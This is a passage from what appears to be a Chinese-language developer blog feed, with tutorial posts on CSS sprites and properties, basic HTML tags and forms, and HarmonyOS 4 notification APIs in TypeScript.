Sprites</strong>，是一种网页<strong>图片应用处理方式</strong>。把网页中<strong>一些背景图片</strong>整合到<strong>一张图片</strong>文件中，再<code>background-position</code> 精确的定位出背景图片的位置。<br>优点：减少服务器被请求次数，减轻服务器的压力，提高页面加载速度<br>实现步骤：</p><ol><li>创建盒子，<strong>盒子尺寸</strong>与<strong>小图</strong>尺寸<strong>相同</strong></li><li>设置盒子<strong>背景图</strong>为精灵图</li><li>添加 <code>background-position</code> 属性，改变<strong>背景图位置</strong></li><li>使用 PxCook 测量小图片<strong>左上角坐标</strong></li><li>取<strong>负数</strong>坐标为 <code>background-position</code> 属性值（向左上移动图片位置）</li></ol><h1 id="CSS修饰属性"><a href="#CSS修饰属性" class="headerlink" title="CSS修饰属性"></a>CSS修饰属性</h1><h2 id="垂直对齐方式"><a href="#垂直对齐方式" class="headerlink" title="垂直对齐方式"></a>垂直对齐方式</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1680340838945.png" alt="1680340838945.png"></p><p>属性名：<code>vertical-align</code></p><table><thead><tr><th>属性值</th><th>效果</th></tr></thead><tbody><tr><td>baseline</td><td>基线对齐（默认）</td></tr><tr><td>top</td><td>顶部对齐</td></tr><tr><td>middle</td><td>居中对齐</td></tr><tr><td>bottom</td><td>底部对齐</td></tr></tbody></table><h2 id="过渡（动画）"><a href="#过渡（动画）" class="headerlink" title="过渡（动画）"></a>过渡（动画）</h2><p>作用：可以为一个元素在不同状态之间切换的时候添加<strong>过渡效果</strong><br>属性名：<code>transition</code>（复合属性）<br>属性值：<strong>过渡的属性 花费时间 (s)</strong><br>提示：</p><ul><li>过渡的属性可以是具体的 CSS 属性</li><li>也可以为 <code>all</code>（两个状态属性值不同的所有属性，都产生过渡效果）</li><li><code>transition</code> 设置给元素本身</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">1s</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="透明度opacity"><a href="#透明度opacity" class="headerlink" title="透明度opacity"></a>透明度opacity</h2><p>作用：设置<strong>整个元素的透明度</strong>（包含背景和内容）<br>属性名：<code>opacity</code><br>属性值：0 – 1</p><ul><li>0：完全透明（元素不可见）</li><li>1：不透明</li><li>0-1之间小数：半透明</li></ul><h2 id="光标类型cursor"><a href="#光标类型cursor" class="headerlink" title="光标类型cursor"></a>光标类型cursor</h2><p>作用：鼠标悬停在元素上时指针显示样式<br>属性名：<code>cursor</code></p><table><thead><tr><th>属性值</th><th>效果</th></tr></thead><tbody><tr><td>default</td><td>默认值，通常是箭头</td></tr><tr><td>pointer</td><td>小手效果，表示可以点击</td></tr><tr><td>text</td><td>工字标，表示可以选择文字</td></tr><tr><td>move</td><td>十字标，表示可以移动</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> 前端基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> css </tag>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML用法</title>
      <link href="/2024/01/18/HTML%E7%94%A8%E6%B3%95/"/>
      <url>/2024/01/18/HTML%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="标题标签"><a href="#标题标签" class="headerlink" title="标题标签"></a>标题标签</h1><p><code>&lt;h1&gt;&lt;/h1&gt;</code></p><p>h1~h6（双标签）</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240119230936.png" alt="image.png"></p><ul><li>h1 标签一个网页只能用一次，用来放标题或者logo</li><li>h2~h6 没有使用限制</li></ul><h1 id="段落标签"><a href="#段落标签" class="headerlink" title="段落标签"></a>段落标签</h1><p><code>&lt;p&gt;&lt;/p&gt;</code></p><ul><li>独占一行</li><li>段落没有间隙</li></ul><h1 id="换行和水平线标签"><a href="#换行和水平线标签" class="headerlink" title="换行和水平线标签"></a>换行和水平线标签</h1><p>有时候段落需要换行可以使用</p><ul><li>换行：<code>&lt;br&gt;</code></li><li>水平线：<code>&lt;hr&gt;</code></li></ul><h1 id="文本格式化标签"><a href="#文本格式化标签" class="headerlink" title="文本格式化标签"></a>文本格式化标签</h1><p>为文本添加特殊格式，以突出重点，均为双标签</p><table><thead><tr><th>标签名</th><th>效果</th></tr></thead><tbody><tr><td>strong &#x2F; b</td><td>加粗</td></tr><tr><td>em &#x2F; i</td><td>倾斜</td></tr><tr><td>ins &#x2F; u</td><td>下划线</td></tr><tr><td>del &#x2F; s</td><td>删除线</td></tr></tbody></table><h1 id="媒体标签"><a href="#媒体标签" class="headerlink" title="媒体标签"></a>媒体标签</h1><h2 id="图像标签"><a href="#图像标签" class="headerlink" title="图像标签"></a>图像标签</h2><p><code>&lt;img src=&quot;图片地址&quot;&gt;</code></p><table><thead><tr><th>属性</th><th>作用</th><th>说明</th></tr></thead><tbody><tr><td>alt</td><td>替换文本</td><td>图片无法显示的时候显示的文字</td></tr><tr><td>title</td><td>提示文本</td><td>鼠标悬停显示的文字</td></tr><tr><td>width</td><td>图片宽度</td><td></td></tr><tr><td>height</td><td>图片高度</td><td></td></tr></tbody></table><h2 id="音频标签"><a href="#音频标签" class="headerlink" title="音频标签"></a>音频标签</h2><p><code>&lt;audio src=&quot;音频地址&quot;&gt;&lt;/audio&gt;</code></p><table><thead><tr><th>属性</th><th>作用</th><th>特殊说明</th></tr></thead><tbody><tr><td>src</td><td>音频URL</td><td></td></tr><tr><td>controls</td><td>显示音频控制面板</td><td></td></tr><tr><td>loop</td><td>循环播放</td><td></td></tr><tr><td>autoplay</td><td>自动播放</td><td>浏览器通常会禁用自动播放</td></tr></tbody></table><h2 id="视频标签"><a href="#视频标签" class="headerlink" title="视频标签"></a>视频标签</h2><p><code>&lt;video src=&quot;视频地址&quot;&gt;&lt;/video&gt;</code></p><table><thead><tr><th>属性</th><th>作用</th><th>特殊说明</th></tr></thead><tbody><tr><td>src</td><td>视频URL</td><td></td></tr><tr><td>controls</td><td>显示视频控制面板</td><td></td></tr><tr><td>loop</td><td>循环播放</td><td></td></tr><tr><td>muted</td><td>静音播放</td><td></td></tr><tr><td>autoplay</td><td>自动播放</td><td>浏览器通常会禁用自动播放</td></tr></tbody></table><h1 id="超链接标签"><a href="#超链接标签" class="headerlink" title="超链接标签"></a>超链接标签</h1><p><code>&lt;a href=&quot;www.bilibili.com&quot;&gt;B站&lt;/a&gt;</code></p><ul><li>href是用于跳转网页的属性，必须有</li><li>超链接默认是在当前窗口跳转页面，添加<code>target=&quot;_blank&quot;</code>实现新窗口页面</li></ul><h1 id="列表标签"><a href="#列表标签" class="headerlink" title="列表标签"></a>列表标签</h1><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>无序标签前面会有一个点，使用<code>list-style-type: none</code>可以去除</li></ul><h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>通常前面会有数字</li></ul><h2 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>内容1<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>内容2<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>dl</code>嵌套<code>dt</code>和<code>dd</code>，<code>dl</code>是定义列表，<code>dt</code>是定义列表的标题，<code>dd</code>是定义列表的内容</li></ul><h1 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h1><p><code>table</code>嵌套<code>tr</code>，<code>tr</code>嵌套<code>td</code>&#x2F;<code>th</code></p><table><thead><tr><th>标签名</th><th>说明</th></tr></thead><tbody><tr><td>table</td><td>表格</td></tr><tr><td>tr</td><td>行</td></tr><tr><td>th</td><td>表头单元格</td></tr><tr><td>td</td><td>内容单元格</td></tr><tr><td>thead</td><td>表格头部</td></tr><tr><td>tbody</td><td>表格主体</td></tr><tr><td>tfoot</td><td>表格底部</td></tr></tbody></table><ul><li>可以使用<code>border</code>属性添加边框线</li></ul><p><strong>合并单元格：</strong></p><ol><li>保留最左最上的单元格，添加属性（取值是数字，表示需要合并的单元格数量）</li><li>跨行合并，保留最上单元格，添加属性 <code>rowspan</code></li><li>跨列合并，保留最左单元格，添加属性 <code>colspan</code></li></ol><ul><li>合并单元格不能跨（thead、tbody、tfoot）</li></ul><h1 id="表单标签"><a href="#表单标签" class="headerlink" title="表单标签"></a>表单标签</h1><p><code>&lt;input type=&quot;...&quot; placeholder=&quot;提示信息&quot;&gt;</code></p><h2 id="单选框radio"><a href="#单选框radio" class="headerlink" title="单选框radio"></a>单选框radio</h2><p><strong>常用：</strong></p><ul><li><code>name</code>，控件分组，同组只能选一个（用于单选功能）</li><li><code>checked</code>，默认选择</li></ul><h2 id="上传文件file"><a href="#上传文件file" class="headerlink" title="上传文件file"></a>上传文件file</h2><p><code>&lt;input type=&quot;file&quot; multiple&gt;</code></p><ul><li>默认情况下，文件上传表单控件只能上传一个文件，添加<code>multiple</code>属性可以实现文件多选功能</li></ul><h2 id="多选框checkbox"><a href="#多选框checkbox" class="headerlink" title="多选框checkbox"></a>多选框checkbox</h2><p><code>&lt;input type=&quot;checkbox&quot; checked&gt; 前端代码</code></p><ul><li>实现多选框</li><li>默认选择：<code>checked</code></li></ul><h2 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span>&gt;</span>广州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>深圳<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>select</code>嵌套<code>option</code>，<code>select</code>是下拉菜单，<code>option</code>是项目，<code>selected</code>是默认选中</li></ul><h2 id="文本域"><a href="#文本域" class="headerlink" title="文本域"></a>文本域</h2><p><code>&lt;textarea&gt;默认提醒文字&lt;/textarea&gt;</code></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240119234254.png" alt="image.png"></p><ul><li>可以多行输入文本的表单控件</li></ul><h2 id="label标签"><a href="#label标签" class="headerlink" title="label标签"></a>label标签</h2><p>可用于增大表单控件的点击范围</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*方法一*/</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;man&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;man&quot;</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">/*方法二*/</span><br><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="按钮button"><a href="#按钮button" class="headerlink" title="按钮button"></a>按钮button</h2><p><code>&lt;button type=&quot;&quot;&gt;按钮&lt;/button&gt;</code></p><table><thead><tr><th>type属性值</th><th>说明</th></tr></thead><tbody><tr><td>submit</td><td>提交按钮，点击后可以提交数据到后台（默认）</td></tr><tr><td>reset</td><td>重置按钮</td></tr><tr><td>button</td><td>普通按钮，配合JavaScript使用</td></tr></tbody></table><h1 id="语义化"><a href="#语义化" class="headerlink" title="语义化"></a>语义化</h1><p><strong>无语义的布局标签：</strong><br>作用：布局网页，划分区域</p><ul><li><code>div</code>：独占一行</li><li><code>span</code>：不换行</li></ul><p><strong>有语义的布局标签：</strong></p><table><thead><tr><th>标签名</th><th>语义</th></tr></thead><tbody><tr><td>header</td><td>网页头部</td></tr><tr><td>nav</td><td>网页导航</td></tr><tr><td>footer</td><td>网页底部</td></tr><tr><td>aside</td><td>网页侧边栏</td></tr><tr><td>section</td><td>网页区块</td></tr><tr><td>article</td><td>网页文章</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> 前端基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> css </tag>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鸿蒙HarmonyOS 4-通知</title>
      <link href="/2024/01/16/%E9%B8%BF%E8%92%99HarmonyOS%204-%E9%80%9A%E7%9F%A5/"/>
      <url>/2024/01/16/%E9%B8%BF%E8%92%99HarmonyOS%204-%E9%80%9A%E7%9F%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="基础通知"><a href="#基础通知" class="headerlink" title="基础通知"></a>基础通知</h1><p>应用可以通过通知接口发送通知消息，提醒用户关注应用中的变化。用户可以在通知栏查看和操作通知内容。</p><ol><li>导入notification模块</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> notificationManager <span class="keyword">from</span> <span class="string">&#x27;@ohos.notificationManager&#x27;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>发送通知</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2.1 构建通知请求</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">request</span>: notificationManager.<span class="property">NotificationRequest</span> = &#123;</span><br><span class="line"><span class="attr">id</span>: <span class="number">10</span>,</span><br><span class="line"><span class="attr">content</span>: &#123;</span><br><span class="line"><span class="comment">//通知内容</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2.2 发布通知</span></span><br><span class="line">notificationManager.<span class="title function_">publish</span>(request)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;发送成功&#x27;</span>))</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;发送失败&#x27;</span>， <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(reason)))</span><br></pre></td></tr></table></figure><ol start="3"><li>取消通知</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//取消指定id的通知</span></span><br><span class="line">notificationManager.<span class="title function_">cancel</span>(<span class="number">10</span>)</span><br><span class="line"><span class="comment">//取消当前应用的所有通知</span></span><br><span class="line">notificationManager.<span class="title function_">cancelAll</span>()</span><br></pre></td></tr></table></figure><h2 id="通知类型"><a href="#通知类型" class="headerlink" title="通知类型"></a>通知类型</h2><p>通知的类型分为四种，其中后面三种为需展开的显示方式。</p><table><thead><tr><th>类型枚举</th><th>说明</th></tr></thead><tbody><tr><td>NOTIFICATION_CONTENT_BASIC_TEXT</td><td>普通文本型</td></tr><tr><td>NOTIFICATION_CONTENT_LONG_TEXT</td><td>长文本型</td></tr><tr><td>NOTIFICATION_CONTENT_MULTILINE</td><td>多行文本型</td></tr><tr><td>NOTIFICATION_CONTENT_PICTURE</td><td>图片型</td></tr></tbody></table><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240116153213.png" alt="image.png"></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通文本型</span></span><br><span class="line"><span class="attr">content</span>: &#123;</span><br><span class="line"><span class="attr">contentType</span>: notificationManager.<span class="property">ContentType</span>.<span class="property">NOTIFICATION_CONTENT_BASIC_TEXT</span>,</span><br><span class="line"><span class="attr">normal</span>: &#123;</span><br><span class="line"><span class="attr">title</span>: <span class="string">&#x27;通知标题&#x27;</span>,</span><br><span class="line"><span class="attr">text</span>: <span class="string">&#x27;通知内容详情&#x27;</span>,</span><br><span class="line"><span class="attr">additionalText</span>: <span class="string">&#x27;通知附加内容&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 长文本型</span></span><br><span class="line"><span class="attr">content</span>: &#123;</span><br><span class="line"><span class="attr">contentType</span>: noticationManager.<span class="property">ContentType</span>.<span class="property">NOTIFICATION_CONTENT_LONG_TEXT</span>,</span><br><span class="line"><span class="attr">longText</span>: &#123;</span><br><span class="line"><span class="attr">title</span>: <span class="string">&#x27;通知标题&#x27;</span>,  <span class="comment">//展开前的标题</span></span><br><span class="line"><span class="attr">text</span>: <span class="string">&#x27;通知内容详情&#x27;</span>,  <span class="comment">//展开前的内容</span></span><br><span class="line"><span class="attr">additionalText</span>: <span class="string">&#x27;通知附加内容&#x27;</span>,</span><br><span class="line"><span class="attr">longText</span>: <span class="string">&#x27;通知中的长文本，我很长，我很长，我很长...&#x27;</span>,</span><br><span class="line"><span class="attr">briefText</span>: <span class="string">&#x27;通知概要和总结&#x27;</span>,  <span class="comment">//在该模式没有作用</span></span><br><span class="line"><span class="attr">expandedTitle</span>: <span class="string">&#x27;通知展开时的标题&#x27;</span>  <span class="comment">//展开后的标题</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//多行文本型</span></span><br><span class="line"><span class="attr">content</span>: &#123;</span><br><span class="line"><span class="attr">contentType</span>: noticationManager.<span class="property">ContentType</span>.<span class="property">NOTIFICATION_CONTENT_MULTILINE</span>,</span><br><span class="line"><span class="attr">multiline</span>: &#123;</span><br><span class="line"><span class="attr">title</span>: <span class="string">&#x27;通知标题&#x27;</span>,</span><br><span class="line"><span class="attr">text</span>: <span class="string">&#x27;通知内容详情&#x27;</span>,</span><br><span class="line"><span class="attr">additionalText</span>: <span class="string">&#x27;通知附加内容&#x27;</span>,</span><br><span class="line"><span class="attr">briefText</span>: <span class="string">&#x27;通知概要和总结&#x27;</span>,</span><br><span class="line"><span class="attr">longTitle</span>: <span class="string">&#x27;展开时的标题，有多行，很宽&#x27;</span>,</span><br><span class="line"><span class="attr">lines</span>: [</span><br><span class="line"><span class="string">&#x27;第一行&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;第二行&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;第三行&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;第四行&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//图片型</span></span><br><span class="line"><span class="attr">content</span>: &#123;</span><br><span class="line"><span class="attr">contentType</span>: noticationManager.<span class="property">ContentType</span>.<span class="property">NOTIFICATION_CONTENT_PICTURE</span>,</span><br><span class="line"><span class="attr">picture</span>: &#123;</span><br><span class="line"><span class="attr">title</span>: <span class="string">&#x27;通知标题&#x27;</span>,</span><br><span class="line"><span class="attr">text</span>: <span class="string">&#x27;通知内容详情&#x27;</span>,</span><br><span class="line"><span class="attr">additionalText</span>: <span class="string">&#x27;通知附加内容&#x27;</span>,</span><br><span class="line"><span class="attr">briefText</span>: <span class="string">&#x27;通知概要和总结&#x27;</span>,  <span class="comment">//在这个模式有作用，位于展开标题和图片之间</span></span><br><span class="line"><span class="attr">expandedTitle</span>: <span class="string">&#x27;展开后的标题&#x27;</span>,</span><br><span class="line"><span class="attr">picture</span>: <span class="variable language_">this</span>.<span class="property">pixel</span>  <span class="comment">//格式为PixelMap类型</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//PixelMap图片获取</span></span><br><span class="line"><span class="keyword">async</span> <span class="title function_">aboutToAppear</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="comment">//获取资源管理器</span></span><br><span class="line"><span class="keyword">let</span> rm = <span class="title function_">getContext</span>(<span class="variable language_">this</span>).<span class="property">resourceManager</span>;</span><br><span class="line"><span class="comment">//读取图片</span></span><br><span class="line"><span class="keyword">let</span> file = <span class="keyword">await</span> rm.<span class="title function_">getMediaContent</span>($r(<span class="string">&#x27;app.media.xxx&#x27;</span>))</span><br><span class="line"><span class="comment">//创建PixelMap</span></span><br><span class="line">image.<span class="title function_">createImageSource</span>(file.<span class="property">buffer</span>).<span class="title function_">createPixelMap</span>()</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> <span class="variable language_">this</span>.<span class="property">pixel</span> = value)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">reason</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;testTag&#x27;</span>, <span class="string">&#x27;加载图片异常&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(reason)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>关于PixelMap的详细内容参考<a href="https://developer.harmonyos.com/cn/docs/documentation/doc-guides-V3/image-overview-0000001495825661-V3">鸿蒙开发文档</a></li></ul><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//更多通知用法</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">request</span>: notificationManager.<span class="property">NotificationRequest</span> = &#123;  </span><br><span class="line">  <span class="attr">id</span>: <span class="variable language_">this</span>.<span class="property">idx</span> ++,  </span><br><span class="line">  <span class="attr">content</span>: &#123;  </span><br><span class="line">    <span class="attr">contentType</span>: notificationManager.<span class="property">ContentType</span>.<span class="property">NOTIFICATION_CONTENT_BASIC_TEXT</span>,  </span><br><span class="line">    <span class="attr">normal</span>: &#123;  </span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;普通通知&#x27;</span> + <span class="variable language_">this</span>.<span class="property">idx</span>,  </span><br><span class="line">      <span class="attr">text</span>: <span class="string">&#x27;普通通知内容&#x27;</span>,  </span><br><span class="line">      <span class="attr">additionalText</span>: <span class="string">&#x27;通知附加内容&#x27;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;,  </span><br><span class="line">  <span class="attr">deliveryTime</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>(),  <span class="comment">//投递的时间</span></span><br><span class="line">  <span class="attr">showDeliveryTime</span>: <span class="literal">true</span>,    <span class="comment">//显示时间</span></span><br><span class="line">  <span class="attr">groupName</span>: <span class="string">&#x27;WeChat&#x27;</span>,    <span class="comment">//通知组，有多个相同groupName通知会合在一起</span></span><br><span class="line">  <span class="attr">slotType</span>: notificationManager.<span class="property">SlotType</span>.<span class="property">SOCIAL_COMMUNICATION</span>  <span class="comment">//通道类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>类型枚举</th><th>说明</th><th>状态栏图标</th><th>提示音</th><th>横幅</th></tr></thead><tbody><tr><td>SOCIAL_COMMUNICATION</td><td>社交类型</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td>SERVICE_INFORMATION</td><td>服务类型</td><td>✓</td><td>✓</td><td>X</td></tr><tr><td>CONTENT_INFORMATION</td><td>内容类型</td><td>✓</td><td>X</td><td>X</td></tr><tr><td>OTHER_TYPES</td><td>其他</td><td>X</td><td>X</td><td>X</td></tr></tbody></table><ul><li>更多使用方法可以参考鸿蒙开发文档</li></ul><h1 id="进度条通知"><a href="#进度条通知" class="headerlink" title="进度条通知"></a>进度条通知</h1><p><strong>进度条通知</strong>会展示一个动态的进度条，主要用于文件下载、长任务处理的进度显示。</p><ol><li>判断当前系统是否支持进度条模板</li></ol><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> isSupport = <span class="keyword">await</span> notify.<span class="title function_">isSupportTemplate</span>(<span class="string">&#x27;downloadTemplate&#x27;</span>) </span><br><span class="line"><span class="comment">//判断动作可以放在aboutToAppear()当中</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable language_">this</span>.<span class="property">isSupport</span>)&#123;  